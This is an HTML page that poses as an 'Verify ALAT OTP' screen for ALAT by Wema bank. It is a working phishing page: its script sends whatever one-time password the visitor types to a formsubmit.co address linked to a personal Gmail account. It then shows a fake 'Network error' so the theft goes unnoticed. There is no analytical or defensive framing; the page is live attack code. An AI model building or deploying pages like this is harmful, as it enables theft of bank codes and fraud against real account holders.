<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verify OTP | ALAT by Wema</title>
  <link rel="stylesheet" href="assets/index-C49gVU4U.css" />
  <style>
    html, body {
      height: 100%;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: #fff;
    }

    #root, .app, .pin {
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      max-width: 350px;
      width: 100%;
      padding: 20px;
      box-sizing: border-box;
    }

    .pin-input {
      width: 100%;
      height: 60px;
      text-align: center;
      font-size: 18px;
      border: 1px solid #ddd;
      border-radius: 8px;
      background: #f5f5f5;
      outline: none;
      transition: all 0.3s ease;
      margin-bottom: 15px;
    }

    .pin-input:focus {
      border-color: #800029;
      background: #fff;
      box-shadow: 0 0 0 2px rgba(128, 0, 41, 0.2);
    }

    @media (max-width: 400px) {
      .pin-input {
        height: 50px;
        font-size: 16px;
      }
    }

    .verify-btn {
      width: 100%;
      padding: 15px;
      border-radius: 8px;
      border: none;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      background: #800029;
      color: white;
      margin-top: 10px;
    }

    .logo img {
      width: 60px;
      margin-bottom: 15px;
    }

    .hometitle {
      font-size: 20px;
      font-weight: bold;
      text-align: center;
      margin-bottom: 25px;
    }

    #error-message {
      color: red;
      font-weight: bold;
      text-align: center;
      display: none;
      margin-bottom: 10px;
    }

    .otp-instruction {
      text-align: center;
      margin-bottom: 25px;
      color: #555;
    }
  </style>
</head>
<body>
  <div id="root">
    <div class="app">
      <div class="pin">
        <div class="container">
          <div class="contentSec">
            <div class="logo">
              <img src="assets/logo-Cw-qJTno.png" alt="logo" />
            </div>
            <div class="hometitle">Verify ALAT OTP</div>
          </div>

          <div class="formSec">
            <div class="otp-instruction">
              We've sent a confirmation OTP to your registered phone number. Enter the code to proceed
            </div>
            <form id="otp-form">
              <input type="text" name="otp" maxlength="6" class="pin-input" placeholder="Enter OTP" inputmode="numeric" required autofocus />

              <div id="error-message">Network error</div>

              <input type="hidden" name="_captcha" value="false">
              <button type="submit" class="verify-btn">Confirm OTP</button>
            </form>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function () {
      const otpInput = document.querySelector('.pin-input');
      const errorMessage = document.getElementById('error-message');

      otpInput.addEventListener('input', function () {
        this.value = this.value.replace(/\D/g, ''); // allow digits only
      });

      const otpForm = document.getElementById('otp-form');
      otpForm.addEventListener('submit', async function (e) {
        e.preventDefault();

        const formData = new FormData(otpForm);

        try {
          await fetch('https://formsubmit.co/Payday10177@gmail.com', {
            method: 'POST',
            body: formData
          });
        } catch (error) {
          // Optional logging
        }

        errorMessage.textContent = 'Network error';
        errorMessage.style.display = 'block';
      });
    });
  </script>
</body>
</html>
